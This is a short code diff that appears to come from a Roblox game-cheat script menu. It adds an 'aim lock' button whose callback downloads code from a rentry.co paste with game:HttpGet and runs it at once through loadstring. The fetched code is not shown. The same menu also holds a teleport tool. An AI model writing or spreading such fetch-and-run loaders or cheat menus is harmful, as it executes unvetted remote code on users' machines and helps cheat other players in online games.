@@ -65,6 +65,10 @@ local Section = Tab:AddSection({
 	Name = "Tools"
 })
 
+Tab:AddButton({ 	Name  = "aim lock", 	Callback = function()
+loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
+end })
+
 Tab:AddButton({ 	Name  = "Teleoport tool", 	Callback = function()
 
   local plr = game:GetService("Players").LocalPlayer
